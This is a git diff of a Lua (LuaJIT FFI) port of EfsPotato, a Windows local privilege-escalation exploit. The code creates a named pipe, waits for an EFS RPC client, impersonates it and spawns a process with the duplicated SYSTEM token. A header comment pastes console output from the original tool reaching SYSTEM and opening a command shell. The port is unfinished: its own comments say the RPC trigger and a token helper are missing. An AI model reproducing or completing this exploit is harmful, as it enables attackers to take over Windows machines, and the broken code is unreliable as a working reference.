@@ -1,8 +1,27 @@
+--[[ PS C:\Users\Fantastic\Desktop\Sayuri\PrivFu\ArtsOfGetSystem\EfsPotato\obj\Debug> .\EfsPotato.exe -i -c cmd.exe
+
+[>] Trying to create named pipe.
+[+] Named pipe is created successfully.
+    [*] Path : \\.\pipe\{1306D9C6-4BAE-4527-9F0B-75B32A74E054}\pipe\srvsvc
+[>] Waiting for named pipe connection.
+[>] Calling EfsRpcEncryptFileSrv().
+    [*] Target File Path   : \\localhost/pipe/{1306D9C6-4BAE-4527-9F0B-75B32A74E054}\C$\PrivFu.txt
+    [*] Endpoint Pipe Name : \pipe\efsrpc
+[+] Got named pipe connection.
+[+] Named pipe impersonation is successful (SID: S-1-5-18).
+[+] SYSTEM process is executed successfully (PID = 28224).
+Microsoft Windows [Version 10.0.22621.2715]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Fantastic\Desktop\Sayuri\PrivFu\ArtsOfGetSystem\EfsPotato\obj\Debug>
+]] --
+
 -- Load the FFI library for Windows API
 local ffi = require("ffi")
 
--- include kernel32.dll
+-- include libraries via DLL.
 local kernel32 = ffi.load("kernel32")
+local advapi32 = ffi.load("advapi32")
 
 -- Define necessary Windows API types and functions
 ffi.cdef[[
@@ -16,6 +35,31 @@ typedef uint32_t UINT;
 typedef int64_t LARGE_INTEGER;
 typedef uint32_t ULONG;
 typedef uint32_t ULONG_PTR;
+typedef uint16_t WORD;
+typedef void* LPBYTE;
+typedef int NTSTATUS;
+typedef wchar_t WCHAR;
+typedef const wchar_t* LPCWSTR;
+typedef wchar_t* LPWSTR;
+typedef const char* LPCSTR;
+
+enum ACCESS_MASK {
+    NO_ACCESS = 0, // Add other access mask values if needed
+};
+
+enum DUPLICATE_OPTION_FLAGS {
+    SAME_ACCESS = 0x2,    // Add other duplicate option flags if needed
+};
+
+NTSTATUS NtDuplicateObject(
+    HANDLE SourceProcessHandle,
+    HANDLE SourceHandle,
+    HANDLE TargetProcessHandle,
+    HANDLE* TargetHandle,
+    enum ACCESS_MASK DesiredAccess,
+    unsigned long HandleAttributes,
+    enum DUPLICATE_OPTION_FLAGS Options
+);
 
 typedef struct {
     uintptr_t Internal;
@@ -29,6 +73,34 @@ typedef struct {
     } DUMMYUNIONNAME;
     HANDLE hEvent;
 } OVERLAPPED;
+
+typedef struct _STARTUPINFO {
+    DWORD  cb;
+    char* lpReserved;  // or wchar_t* lpReserved;
+    char* lpDesktop;   // or wchar_t* lpDesktop;
+    char* lpTitle;     // or wchar_t* lpTitle;
+    DWORD  dwX;
+    DWORD  dwY;
+    DWORD  dwXSize;
+    DWORD  dwYSize;
+    DWORD  dwXCountChars;
+    DWORD  dwYCountChars;
+    DWORD  dwFillAttribute;
+    DWORD  dwFlags;
+    WORD   wShowWindow;
+    WORD   cbReserved2;
+    LPBYTE lpReserved2;
+    HANDLE hStdInput;
+    HANDLE hStdOutput;
+    HANDLE hStdError;
+} STARTUPINFO, *LPSTARTUPINFO;
+
+typedef struct _PROCESS_INFORMATION {
+    HANDLE hProcess;
+    HANDLE hThread;
+    DWORD dwProcessId;
+    DWORD dwThreadId;
+} PROCESS_INFORMATION, *LPPROCESS_INFORMATION;
 
 HANDLE CreateNamedPipeA(
     LPSTR lpName, 
@@ -51,6 +123,31 @@ DWORD CreateProcessWithTokenW(HANDLE hToken, DWORD dwLogonFlags, LPSTR lpApplica
 DWORD NtSetInformationToken(HANDLE TokenHandle, INT TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
 HANDLE CreateEventA(void*, int, int, const char*);
 int SetEvent(HANDLE);
+HANDLE OpenProcess(
+    unsigned long dwDesiredAccess,
+    int bInheritHandle,
+    unsigned long dwProcessId
+);
+int OpenProcessToken(
+    HANDLE ProcessHandle,
+    unsigned long DesiredAccess,
+    HANDLE* TokenHandle
+);
+int GetCurrentProcessId();
+
+HANDLE CreateProcessAsUserA(
+    HANDLE hToken,
+    LPCSTR lpApplicationName,
+    LPSTR lpCommandLine,
+    void* lpProcessAttributes,
+    void* lpThreadAttributes,
+    int bInheritHandles,
+    unsigned long dwCreationFlags,
+    void* lpEnvironment,
+    LPCSTR lpCurrentDirectory,
+    const STARTUPINFO* lpStartupInfo,
+    PROCESS_INFORMATION* lpProcessInformation
+);
 ]]
 
 -- Constants and variables
@@ -70,12 +167,31 @@ local CREATE_EVENT_INITIAL_STATE = 0x0002
 -- endpoint pipe name
 local endpointPipeName = "efsrpc"
 
--- Convert endpointPipeName to a char pointer
-local userPipeName = ffi.new("char[?]", #endpointPipeName + 1)
-ffi.copy(userPipeName, endpointPipeName)
+function generateGUID()
+    local template ='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
+    return string.gsub(template, '[xy]', function (c)
+        local v = (c == 'x') and math.random(0, 0xf) or math.random(8, 0xb)
+        return string.format('%x', v)
+    end)
+end
+
+function DuplicateCurrentToken()
+    local hProcess = ffi.C.GetCurrentProcess()
+    local hToken = ffi.new("HANDLE[1]")
+
+    if advapi32.OpenProcessToken(hProcess, bit.bor(TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE), hToken) == 0 then
+        local error = ffi.C.GetLastError()
+        print("[-] Failed to open process token.")
+        print("    |-> Error: " .. error)
+        return nil
+    end
+
+    return hToken[0]
+end
 
 -- Function to create a new named pipe
 local function createNamedPipe(pipeName)
+    print("createNamedPipe called with " .. pipeName)
     local hPipe = ffi.C.CreateNamedPipeA(
         ffi.cast("LPSTR", pipeName),  -- Use ffi.cast to convert Lua string to LPSTR
         PIPE_ACCESS_DUPLEX,
@@ -97,9 +213,6 @@ local function createNamedPipe(pipeName)
     end
     return hPipe
 end
-
--- Create userPipeName
-local hPipe = createNamedPipe(userPipeName) -- Pass the char pointer
 
 -- default options
 local sessionId = 0 
@@ -136,7 +249,7 @@ local function connectNamedPipe(hPipe)
         end
     end
     print("[+] Waiting for named pipe connection.")
-    ffi.C.WaitForSingleObject(overlapped.hEvent, -Globals.Timeout * 10000)
+    ffi.C.WaitForSingleObject(overlapped.hEvent, 10000)
     ffi.C.CloseHandle(overlapped.hEvent)
     print("[+] Got named pipe connection.")
     return true
@@ -144,24 +257,25 @@ end
 
 -- Function to impersonate named pipe client
 local function impersonateNamedPipeClient(hPipe)
-    if not ffi.C.ImpersonateNamedPipeClient(hPipe) then
+    if not advapi32.ImpersonateNamedPipeClient(hPipe) then
         local error = ffi.C.GetLastError()
         print("[-] Failed to named pipe impersonation.")
         print("    |-> Error: " .. error)
         return false
     else
-        local sid = ffi.new("char[?]", 256) -- Adjust the size as needed
-        print("[+] Named pipe impersonation is successful (SID: " .. ffi.string(sid) .. ").")
+        -- could get the SID before this.
+        print("[+] Named pipe impersonation is successful")
         ffi.C.CloseHandle(hPipe)
         hPipe = ffi.cast("HANDLE", ffi.cast("uintptr_t", -1))  -- Corrected the error in this line
         return true
     end
 end
 
--- Function to duplicate the current token
+-- Function to duplicate the current token (You need to implement this function)
 local function duplicateCurrentToken()
     local hToken = ffi.new("HANDLE[1]")
-    if ffi.C.DuplicateTokenEx(ffi.C.GetCurrentProcess(), TOKEN_ASSIGN_PRIMARY + TOKEN_DUPLICATE, nil, 2, 1, hToken) == 0 then
+    local existingToken = DuplicateCurrentToken()
+    if advapi32.DuplicateTokenEx(existingToken, bit.bor(TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE), nil, 2, 1, hToken) == 0 then
         local error = ffi.C.GetLastError()
         print("[-] Failed to duplicate the current token.")
         print("    |-> Error: " .. error)
@@ -172,29 +286,32 @@ end
 
 -- Function to create a process with a token
 local function createProcessWithToken(hToken, command, startupInfo, processInformation)
-    if ffi.C.CreateProcessWithTokenW(
+    local lpCommandLine = ffi.cast("LPSTR", command)
+    if ffi.C.CreateProcessAsUserA(
         hToken,
-         0,
-         nil,
-         command,
-         CREATE_NEW_CONSOLE,
-         nil,
-         nil,
-         startupInfo,
-         processInformation
-     ) == 0 then
-         local error = ffi.C.GetLastError()
-         print("[-] Failed to spawn SYSTEM process.")
-         print("    |-> Error: " .. error)
-         return false
-     else
-         print("[+] SYSTEM process is executed successfully (PID = " .. processInformation.dwProcessId .. ").")
-         return true
-     end
+        nil,
+        lpCommandLine,
+        nil,
+        nil,
+        false,
+        0, -- Flags, you can customize this based on your needs
+        nil,
+        ffi.NULL,
+        startupInfo,
+        processInformation
+    ) == 0 then
+        local error = ffi.C.GetLastError()
+        print("[-] Failed to spawn process with user token.")
+        print("    |-> Error: " .. error)
+        return false
+    else
+        print("[+] Process with user token is executed successfully (PID = " .. processInformation.dwProcessId .. ").")
+        return true
+    end
 end
 
 -- Entry point for the GetSystem function
-local function GetSystem(command, endpointPipeName, sessionId, interactive)
+local function GetSystem(command, endpointPipeName)
     -- Check if the endpoint pipe name is valid
     local validEndpoints = {"efsrpc", "lsarpc", "lsass", "netlogon", "samr"}
     if not contains(validEndpoints, endpointPipeName:lower()) then
@@ -215,39 +332,22 @@ local function GetSystem(command, endpointPipeName, sessionId, interactive)
         return false
     end
 
+    -- Generate a GUID and use it in the userPipeName string
+    local userPipeName = generateGUID()
     local pipeName = string.format("\\\\.\\pipe\\%s\\pipe\\srvsvc", ffi.string(userPipeName))
     local hPipe = createNamedPipe(pipeName)
 
+    -- this requires multi-threading which cant happen in Lua, another thread calls the RPC method.
     if hPipe then
         if connectNamedPipe(hPipe) then
             if impersonateNamedPipeClient(hPipe) then
                 local hDupToken = duplicateCurrentToken()
-
-                if interactive then
-                    local startupInfo = ffi.new("STARTUPINFO")
-                    startupInfo.cb = ffi.sizeof("STARTUPINFO")
-                    local processInformation = ffi.new("PROCESS_INFORMATION")
-                    if not createProcessWithToken(hDupToken, command, startupInfo, processInformation) then
-                        -- Handle the error
-                    end
-                else
-                    if sessionId > 0 then
-                        -- Adjust session ID
-                        local pInfoBuffer = ffi.new("int32_t[1]", sessionId)
-                        if ffi.C.NtSetInformationToken(hDupToken, 22, pInfoBuffer, 4) ~= 0 then
-                            print("[-] Failed to adjust session ID.")
-                            -- Handle the error
-                        end
-                    end
-
-                    local startupInfo = ffi.new("STARTUPINFO")
-                    startupInfo.cb = ffi.sizeof("STARTUPINFO")
-                    local processInformation = ffi.new("PROCESS_INFORMATION")
-                    if not createProcessWithToken(hDupToken, command, startupInfo, processInformation) then
-                        -- Handle the error
-                    end
+                local startupInfo = ffi.new("STARTUPINFO")
+                startupInfo.cb = ffi.sizeof("STARTUPINFO")
+                local processInformation = ffi.new("PROCESS_INFORMATION")
+                if not createProcessWithToken(hDupToken, command, startupInfo, processInformation) then
+                    -- Handle the error
                 end
-
                 ffi.C.CloseHandle(hDupToken)
             end
         end
@@ -261,4 +361,4 @@ local function GetSystem(command, endpointPipeName, sessionId, interactive)
 end
 
 -- Call the GetSystem function
-GetSystem("cmd.exe", "efsrpc", 0, true)
+GetSystem("calc.exe", "efsrpc")
